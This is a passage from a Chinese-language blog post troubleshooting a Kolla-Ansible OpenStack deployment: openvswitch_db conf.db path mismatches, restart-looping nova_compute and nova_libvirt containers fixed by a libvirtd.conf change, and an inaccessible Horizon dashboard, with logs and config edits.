class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               e<span class="number">59</span>b<span class="number">0948281</span>e        <span class="number">11</span> hours ago        <span class="number">732</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-ssh                    <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">01</span>c<span class="number">404</span>afdc<span class="number">8</span>b        <span class="number">11</span> hours ago        <span class="number">672</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-api                    <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">29</span>b<span class="number">3451</span>c<span class="number">045</span>        <span class="number">11</span> hours ago        <span class="number">671</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-network                <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               a<span class="number">5</span>cead<span class="number">8</span>aee<span class="number">0</span>b        <span class="number">11</span> hours ago        <span class="number">672</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-openvswitch-agent   <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">36226</span>e<span class="number">14</span>b<span class="number">4</span>d<span class="number">7</span>        <span class="number">11</span> hours ago        <span class="number">670</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-linuxbridge-agent   <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               e<span class="number">9</span>ad<span class="number">4</span>cb<span class="number">7</span>c<span class="number">6</span>cc        <span class="number">11</span> hours ago        <span class="number">670</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-novncproxy             <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">3689</span>a<span class="number">51</span>a<span class="number">5</span>db<span class="number">8</span>        <span class="number">11</span> hours ago        <span class="number">672</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-spicehtml<span class="number">5</span>proxy        <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">55</span>fc<span class="number">9</span>d<span class="number">8</span>a<span class="number">62</span>b<span class="number">5</span>        <span class="number">11</span> hours ago        <span class="number">672</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-metadata-agent      <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">45</span>f<span class="number">0</span>f<span class="number">090</span>cf<span class="number">38</span>        <span class="number">11</span> hours ago        <span class="number">646</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cinder-base                 <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               dd<span class="number">0</span>c<span class="number">5</span>b<span class="number">78</span>af<span class="number">7</span>b        <span class="number">11</span> hours ago        <span class="number">808</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-server              <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">171</span>b<span class="number">7</span>bab<span class="number">73</span>ab        <span class="number">11</span> hours ago        <span class="number">646</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-heat-api                    <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               f<span class="number">334</span>caf<span class="number">10</span>d<span class="number">5</span>a        <span class="number">11</span> hours ago        <span class="number">633</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-horizon                     <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">88</span>ceecbc<span class="number">8</span>cf<span class="number">8</span>        <span class="number">11</span> hours ago        <span class="number">763</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-heat-engine                 <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               a<span class="number">53651463235</span>        <span class="number">11</span> hours ago        <span class="number">633</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-heat-api-cfn                <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">7</span>ec<span class="number">6</span>cdd<span class="number">4</span>b<span class="number">04</span>b        <span class="number">11</span> hours ago        <span class="number">633</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-l<span class="number">3</span>-agent            <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">4744</span>d<span class="number">180</span>b<span class="number">09</span>        <span class="number">11</span> hours ago        <span class="number">646</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-dhcp-agent          <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               d<span class="number">4744</span>d<span class="number">180</span>b<span class="number">09</span>        <span class="number">11</span> hours ago        <span class="number">646</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-glance-base                 <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               f<span class="number">78</span>fa<span class="number">9</span>de<span class="number">5</span>c<span class="number">7</span>b        <span class="number">11</span> hours ago        <span class="number">732</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-nova-base                   <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               aa<span class="number">7</span>ae<span class="number">5</span>ae<span class="number">4818</span>        <span class="number">11</span> hours ago        <span class="number">648</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-neutron-base                <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               ed<span class="number">5</span>f<span class="number">4</span>f<span class="number">60</span>a<span class="number">6</span>f<span class="number">4</span>        <span class="number">11</span> hours ago        <span class="number">646</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-heat-base                   <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">4798734</span>eb<span class="number">0</span>d<span class="number">4</span>        <span class="number">11</span> hours ago        <span class="number">610</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-keystone                    <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">55</span>cf<span class="number">2686</span>b<span class="number">33</span>a        <span class="number">11</span> hours ago        <span class="number">644</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openstack-base              <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">9</span>d<span class="number">511</span>be<span class="number">689</span>b<span class="number">7</span>        <span class="number">22</span> hours ago        <span class="number">572</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-mariadb                     <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               cb<span class="number">4</span>c<span class="number">65</span>a<span class="number">6</span>a<span class="number">637</span>        <span class="number">22</span> hours ago        <span class="number">682</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openvswitch-vswitchd        <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">0179076733</span>aa        <span class="number">22</span> hours ago        <span class="number">380</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-openvswitch-db-server       <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               a<span class="number">9</span>e<span class="number">0</span>e<span class="number">1</span>bd<span class="number">0968</span>        <span class="number">22</span> hours ago        <span class="number">380</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-rabbitmq                    <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               cbaeb<span class="number">0</span>b<span class="number">64930</span>        <span class="number">22</span> hours ago        <span class="number">438</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-memcached                   <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">11</span>aa<span class="number">506130</span>a<span class="number">6</span>        <span class="number">22</span> hours ago        <span class="number">403</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-heka                        <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">89</span>c<span class="number">723045</span>d<span class="number">40</span>        <span class="number">22</span> hours ago        <span class="number">420</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-cron                        <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">4</span>b<span class="number">0</span>b<span class="number">36</span>b<span class="number">058</span>a<span class="number">1</span>        <span class="number">22</span> hours ago        <span class="number">366</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-keepalived                  <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">7</span>fbc<span class="number">06505</span>ddb        <span class="number">23</span> hours ago        <span class="number">411</span> MB</span><br><span class="line"><span class="attribute">kolla</span>/centos-binary-haproxy                     <span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>               <span class="number">7</span>f<span class="number">65</span>eba<span class="number">43909</span>        <span class="number">23</span> hours ago        <span class="number">367</span> MB</span><br><span class="line"><span class="attribute">centos</span>                                          latest              <span class="number">49</span>f<span class="number">7960</span>eb<span class="number">7</span>e<span class="number">4</span>        <span class="number">5</span> weeks ago         <span class="number">200</span> MB</span><br></pre></td></tr></table></figure><h1 id="问题四-openvswitch-db-容器无法启动"><a href="#问题四-openvswitch-db-容器无法启动" class="headerlink" title="问题四: openvswitch_db 容器无法启动"></a>问题四: openvswitch_db 容器无法启动</h1><h2 id="问题描述-3"><a href="#问题描述-3" class="headerlink" title="问题描述"></a>问题描述</h2><p>重新编译了镜像，可是 deploy 的时候又出现了以下错误</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">TASK: [neutron | Waiting the openvswitch_db service <span class="keyword">to</span> be ready] ************** </span><br><span class="line">failed: [localhost] =&gt; &#123;<span class="string">&quot;attempts&quot;</span>: <span class="number">30</span>, <span class="string">&quot;changed&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;cmd&quot;</span>: [<span class="string">&quot;docker&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;openvswitch_db&quot;</span>, <span class="string">&quot;ovs-vsctl&quot;</span>, <span class="string">&quot;--no-wait&quot;</span>, <span class="string">&quot;show&quot;</span>], <span class="string">&quot;delta&quot;</span>: <span class="string">&quot;0:00:00.057827&quot;</span>, <span class="string">&quot;end&quot;</span>: <span class="string">&quot;2018-07-12 08:04:09.663118&quot;</span>, <span class="string">&quot;failed&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;rc&quot;</span>: <span class="number">1</span>, <span class="string">&quot;start&quot;</span>: <span class="string">&quot;2018-07-12 08:04:09.605291&quot;</span>, <span class="string">&quot;stdout_lines&quot;</span>: [], <span class="string">&quot;warnings&quot;</span>: []&#125;</span><br><span class="line">stderr: <span class="built_in">Error</span> response <span class="keyword">from</span> daemon: Container <span class="number">03426314b</span>560db08c762a8f9aebdb4423571a29ba1c22862e3415ac913289c21 <span class="keyword">is</span> restarting, wait <span class="keyword">until</span> the container <span class="keyword">is</span> running</span><br><span class="line">msg: Task failed <span class="keyword">as</span> maximum retries was encountered</span><br><span class="line"></span><br><span class="line">FATAL: all hosts have already failed -- aborting</span><br></pre></td></tr></table></figure><p>和问题一的报错一致，查看容器日志</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">INFO:__main__:Kolla config strategy <span class="keyword">set</span> to: COPY_ALWAYS</span><br><span class="line">INFO:__main__:Loading config <span class="keyword">file</span> at /<span class="keyword">var</span>/lib/kolla/config_files/config.json</span><br><span class="line">INFO:__main__:Validating config <span class="keyword">file</span></span><br><span class="line">INFO:__main__:Copying service configuration files</span><br><span class="line">INFO:__main__:Writing <span class="keyword">out</span> command to execute</span><br><span class="line">Running command: &#x27;/usr/sbin/ovsdb-server /etc/openvswitch/<span class="keyword">conf</span>.<span class="keyword">db</span> -vconsole:emer -vsyslog:<span class="keyword">err</span> -vfile:info --remote=punix:/<span class="keyword">run</span>/openvswitch/<span class="keyword">db</span>.sock --<span class="keyword">log</span>-<span class="keyword">file</span>=/<span class="keyword">var</span>/<span class="keyword">log</span>/openvswitch/ovsdb-server.<span class="keyword">log</span>&#x27;</span><br><span class="line">ovsdb-server: I/O <span class="keyword">error</span>: <span class="keyword">open</span>: /etc/openvswitch/<span class="keyword">conf</span>.<span class="keyword">db</span> failed (<span class="keyword">No</span> such <span class="keyword">file</span> or directory)</span><br></pre></td></tr></table></figure><h2 id="排查问题-1"><a href="#排查问题-1" class="headerlink" title="排查问题"></a>排查问题</h2><p>之前使用的镜像是直接从dockerhub pull的官方的镜像，tag 是 2.0.2，而我使用的 kolla 的版本是 2.0.4。对比了下 2.0.2 和 2.0.4 的openvswitch_db 部分的代码，问题就很明了了。</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">tag:<span class="number">2.0</span>.<span class="number">2</span></span><br><span class="line"></span><br><span class="line">kolla<span class="regexp">/docker/</span>openvswitch<span class="regexp">/openvswitch-db-server/</span>extend_start.sh</span><br><span class="line"></span><br><span class="line">#!<span class="regexp">/bin/</span>bash</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="string">&quot;/run/openvswitch&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -e <span class="string">&quot;/etc/openvswitch/conf.db&quot;</span> ]]; then</span><br><span class="line">    ovsdb-tool create <span class="string">&quot;/etc/openvswitch/conf.db&quot;</span></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">tag:mitaka-eol</span><br><span class="line"></span><br><span class="line">kolla/docker/openvswitch/openvswitch-db-server/extend_start.sh</span><br><span class="line"></span><br><span class="line">mkdir -p <span class="string">&quot;/run/openvswitch&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">[[ ! -e &quot;/var/lib/openvswitch/conf.db&quot; ]]</span>; <span class="keyword">then</span></span><br><span class="line">    ovsdb-tool <span class="built_in">create</span> <span class="string">&quot;/var/lib/openvswitch/conf.db&quot;</span></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>2.0.2的镜像会创建 /etc/openvswitch/conf.db 这个文件，而使用2.0.4的版本启动命令是 </p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;/usr/sbin/ovsdb-server /var/lib/openvswitch/conf.db -vconsole:emer -vsyslog:err -vfile:info --remote=punix:/run/openvswitch/db.sock --log-file=/var/log/openvswitch/ovsdb-server.log&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;config_files&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有会导致问题一的出现，而我重新 build 了镜像，也就是说现在容器启动的时候创建的是 /var/lib/openvswitch/conf.db 。而我修改了启动命令，所以会找不到 /etc/openvswitch/conf.db 文件。解决办法是还原问题一所作的修改:</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># vim <span class="regexp">/usr/</span>share<span class="regexp">/kolla/</span>ansible<span class="regexp">/roles/</span>neutron<span class="regexp">/templates/</span>openvswitch-db-server.json.j2</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;command&quot;</span>: <span class="string">&quot;/usr/sbin/ovsdb-server /var/lib/openvswitch/conf.db -vconsole:emer -vsyslog:err -vfile:info --remote=punix:/run/openvswitch/db.sock --log-file=/var/log/openvswitch/ovsdb-server.log&quot;</span>,</span><br><span class="line">    <span class="string">&quot;config_files&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验证操作"><a href="#验证操作" class="headerlink" title="验证操作"></a>验证操作</h2><p>重新deploy后成功部署</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># kolla-ansible deploy</span></span><br><span class="line"></span><br><span class="line">……</span><br><span class="line">TASK: [manila | Creating Manila database] <span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="emphasis">* </span></span><br><span class="line"><span class="emphasis">skipping: [localhost]</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">TASK: [manila | Reading json from variable] <span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">* </span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">skipping: [localhost]</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">TASK: [manila | Creating Manila database user and setting permissions] <span class="strong">****</span><span class="strong">****</span> </span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">skipping: [localhost]</span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis">TASK: [manila | Running Manila bootstrap container] <span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">**<span class="emphasis">* </span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">skipping: [localhost]</span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">TASK: [manila | Starting manila-api container] <span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span> </span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">skipping: [localhost]</span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">TASK: [manila | Starting manila-scheduler container] <span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">** </span></span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong">skipping: [localhost]</span></span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"></span></span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong">TASK: [manila | Starting manila-share container] **</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span> </span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">skipping: [localhost]</span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis"></span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">PLAY RECAP <span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span> </span></span></span></span></span></span><br><span class="line"><span class="emphasis"><span class="strong"><span class="emphasis"><span class="strong"><span class="emphasis">localhost                  : ok=311  changed=123  unreachable=0    failed=0   </span></span></span></span></span></span><br></pre></td></tr></table></figure><h1 id="问题五-nova-compute-和-nova-libvirt-容器启动失败"><a href="#问题五-nova-compute-和-nova-libvirt-容器启动失败" class="headerlink" title="问题五: nova_compute 和 nova_libvirt 容器启动失败"></a>问题五: nova_compute 和 nova_libvirt 容器启动失败</h1><h2 id="问题描述-4"><a href="#问题描述-4" class="headerlink" title="问题描述"></a>问题描述</h2><p>接问题四，虽然部署成功了，但是查看容器状态，nova 的两个容器总是在启动中</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker ps</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">648c226f0980</span>        kolla/centos-binary-nova-compute:<span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>                <span class="string">&quot;kolla_start&quot;</span>            <span class="number">3</span> days ago          Restarting (<span class="number">0</span>) <span class="number">21</span> hours ago                       nova_compute</span><br><span class="line"><span class="attribute">c492de413c81</span>        kolla/centos-binary-nova-libvirt:<span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span>                <span class="string">&quot;kolla_start&quot;</span>            <span class="number">3</span> days ago          Restarting (<span class="number">6</span>) <span class="number">21</span> hours ago                       nova_libvirt</span><br></pre></td></tr></table></figure><p>查看对应容器的日志<br>nova_compute 容器</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># docker logs <span class="number">648</span>c226f0980</span><br><span class="line">INFO:__main__:Kolla config strategy set to: COPY_ALWAYS</span><br><span class="line">INFO:__main__:Loading config <span class="keyword">file</span> at <span class="regexp">/var/</span>lib<span class="regexp">/kolla/</span>config_files/config.json</span><br><span class="line">INFO:__main__:Validating config <span class="keyword">file</span></span><br><span class="line">INFO:__main__:Copying service configuration files</span><br><span class="line">INFO:__main__:Removing existing destination: <span class="regexp">/etc/</span>nova/nova.conf</span><br><span class="line">INFO:__main__:Copying <span class="regexp">/var/</span>lib<span class="regexp">/kolla/</span>config_files<span class="regexp">/nova.conf to /</span>etc<span class="regexp">/nova/</span>nova.conf</span><br><span class="line">INFO:__main__:Setting permissions <span class="keyword">for</span> <span class="regexp">/etc/</span>nova/nova.conf</span><br><span class="line">INFO:__main__:Writing out command to execute</span><br><span class="line">Running command: <span class="string">&#x27;nova-compute&#x27;</span></span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/python2.7/</span>site-packages<span class="regexp">/pkg_resources/</span>__init__.py:<span class="number">187</span>: RuntimeWarning: You have iterated over the result of pkg_resources.parse_version. <span class="keyword">This</span> is a legacy behavior which is inconsistent with the <span class="keyword">new</span> version <span class="keyword">class</span> introduced in setuptools <span class="number">8.0</span>. In most cases, conversion to a tuple is unnecessary. <span class="keyword">For</span> comparison of versions, <span class="keyword">sort</span> the Version instances directly. <span class="keyword">If</span> you have another use <span class="keyword">case</span> requiring the tuple, please <span class="keyword">file</span> a bug with the setuptools <span class="keyword">project</span> describing that need.</span><br><span class="line">  stacklevel=<span class="number">1</span>,</span><br><span class="line">Traceback (most recent <span class="keyword">call</span> last):</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/eventlet/queue.py&quot;</span>, line <span class="number">118</span>, in <span class="keyword">switch</span></span><br><span class="line">    self.greenlet.<span class="keyword">switch</span>(value)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/eventlet/greenthread.py&quot;</span>, line <span class="number">214</span>, in main</span><br><span class="line">    result = function(*args, **kwargs)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">&quot;/usr/lib/python2.7/site-packages/oslo_service/service.py&quot;</span>, line <span class="number">683</span>, in run_service</span><br><span class="line">    raise SystemExit(<span class="number">1</span>)</span><br><span class="line">SystemExit: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>nova_libvirt 容器</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># docker logs c492de413c81</span><br><span class="line"></span><br><span class="line">INFO:__main__:Kolla config strategy set to: COPY_ALWAYS</span><br><span class="line">INFO:__main__:Loading config <span class="keyword">file</span> at <span class="regexp">/var/</span>lib<span class="regexp">/kolla/</span>config_files/config.json</span><br><span class="line">INFO:__main__:Validating config <span class="keyword">file</span></span><br><span class="line">INFO:__main__:Copying service configuration files</span><br><span class="line">INFO:__main__:Removing existing destination: <span class="regexp">/etc/</span>libvirt/libvirtd.conf</span><br><span class="line">INFO:__main__:Copying <span class="regexp">/var/</span>lib<span class="regexp">/kolla/</span>config_files<span class="regexp">/libvirtd.conf to /</span>etc<span class="regexp">/libvirt/</span>libvirtd.conf</span><br><span class="line">INFO:__main__:Setting permissions <span class="keyword">for</span> <span class="regexp">/etc/</span>libvirt/libvirtd.conf</span><br><span class="line">INFO:__main__:Removing existing destination: <span class="regexp">/etc/</span>libvirt/qemu.conf</span><br><span class="line">INFO:__main__:Copying <span class="regexp">/var/</span>lib<span class="regexp">/kolla/</span>config_files<span class="regexp">/qemu.conf to /</span>etc<span class="regexp">/libvirt/</span>qemu.conf</span><br><span class="line">INFO:__main__:Setting permissions <span class="keyword">for</span> <span class="regexp">/etc/</span>libvirt/qemu.conf</span><br><span class="line">INFO:__main__:Writing out command to execute</span><br><span class="line">Running command: <span class="string">&#x27;/usr/sbin/libvirtd --listen&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h2><h3 id="1-google"><a href="#1-google" class="headerlink" title="1. google"></a>1. google</h3><p>查找到此问题是 kolla-ansible 的一个 bug，详细介绍见 <a href="https://review.openstack.org/#/c/492033/">Fix nova-libvirt and nova-compute fails to deploy</a></p><h3 id="2-依照上文的方法进行修复"><a href="#2-依照上文的方法进行修复" class="headerlink" title="2. 依照上文的方法进行修复"></a>2. 依照上文的方法进行修复</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /usr/share/kolla/ansible/roles/nova/templates/libvirtd.conf.j2</span><br><span class="line"></span><br><span class="line"><span class="addition">+listen_tls = 0</span></span><br><span class="line">listen_tcp = 1</span><br><span class="line">auth_tcp = &quot;none&quot;</span><br><span class="line">ca_file = &quot;&quot;</span><br><span class="line">log_level = 3</span><br><span class="line">log_outputs = &quot;3:file:/var/log/kolla/libvirt/libvirtd.log&quot;</span><br><span class="line">listen_addr = &quot;&#123;&#123; hostvars[inventory_hostname][&#x27;ansible_&#x27; + api_interface][&#x27;ipv4&#x27;][&#x27;address&#x27;] &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><p>清除之前的容器重新 deploy 后，nova_compute 和 nova_libvirt 状态正常</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># <span class="regexp">/root/</span>kolla<span class="regexp">/tools/</span>cleanup-containers</span><br><span class="line"># <span class="regexp">/root/</span>kolla<span class="regexp">/tools/</span>cleanup-host</span><br><span class="line"># kolla-ansible deploy</span><br><span class="line"></span><br><span class="line"># docker ps</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">cffc9fc2774b        kolla/centos-binary-nova-compute:<span class="number">2.0</span>.<span class="number">4</span>                <span class="string">&quot;kolla_start&quot;</span>            <span class="number">5</span> minutes ago       Up <span class="number">5</span> minutes                            nova_compute</span><br><span class="line"><span class="number">5</span>f27c8052238        kolla/centos-binary-nova-libvirt:<span class="number">2.0</span>.<span class="number">4</span>                <span class="string">&quot;kolla_start&quot;</span>            <span class="number">5</span> minutes ago       Up <span class="number">5</span> minutes                            nova_libvirt</span><br></pre></td></tr></table></figure><h1 id="问题六-dashboard-无法访问"><a href="#问题六-dashboard-无法访问" class="headerlink" title="问题六: dashboard 无法访问"></a>问题六: dashboard 无法访问</h1><h2 id="问题描述-5"><a href="#问题描述-5" class="headerlink" title="问题描述"></a>问题描述</h2><p>完成以上步骤后，发现控制台无法访问，端口已经监听，浏览器访问报 “504 Gateway Time-out”</p><h2 id="问题排查-1"><a href="#问题排查-1" class="headerlink" title="问题排查"></a>问题排查</h2><h3 id="1-查看-dashboard-日志"><a href="#1-查看-dashboard-日志" class="headerlink" title="1. 查看 dashboard 日志"></a>1. 查看 dashboard 日志</h3><figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line"># docker exec -it heka bash</span><br><span class="line">(heka)<span class="comment">[heka@allinone /]</span>$ tail -50f /var/log/kolla/horizon/horizon.log</span><br><span class="line"><span class="comment">[Mon Jul 16 05:25:13.065432 2018]</span> <span class="comment">[core:error]</span> <span class="comment">[pid 41]</span> <span class="comment">[client 172.16.15.246:59248]</span> End <span class="keyword">of</span> script output before headers: django.wsgi</span><br><span class="line"><span class="comment">[Mon Jul 16 05:31:23.408902 2018]</span> <span class="comment">[core:error]</span> <span class="comment">[pid 43]</span> <span class="comment">[client 172.16.15.227:57733]</span> End <span class="keyword">of</span> script output before headers: django.wsgi</span><br><span class="line"><span class="comment">[Mon Jul 16 05:31:33.443843 2018]</span> <span class="comment">[core:error]</span> <span class="comment">[pid 40]</span> <span class="comment">[client 172.16.15.246:36708]</span> End <span class="keyword">of</span> script output before headers: django.wsgi</span><br></pre></td></tr></table></figure><h3 id="2-dashboard无法访问的问题"><a href="#2-dashboard无法访问的问题" class="headerlink" title="2. dashboard无法访问的问题"></a>2. dashboard无法访问的问题</h3><p>之前使用 packstack 安装M版也遇到 dashboard 无法访问的问题，问题和此问题一致。详情可以参考 <a href="https://bugs.launchpad.net/horizon/+bug/1573488">Openstack Mitaka: can not access dashboard(internal server 500) </a></p><h3 id="3-修改dashboard文件，加入以下内容"><a href="#3-修改dashboard文件，加入以下内容" class="headerlink" title="3. 修改dashboard文件，加入以下内容"></a>3. 修改dashboard文件，加入以下内容</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"># vim /etc/kolla/horizon/horizon.conf</span><br><span class="line"></span><br><span class="line">    WSGIScriptReloading On</span><br><span class="line">    WSGIDaemonProcess horizon-http processes=5 threads=1 user=horizon group=horizon display-name=%&#123;GROUP&#125; python-path=/usr/lib/python2.7/site-packages</span><br><span class="line">    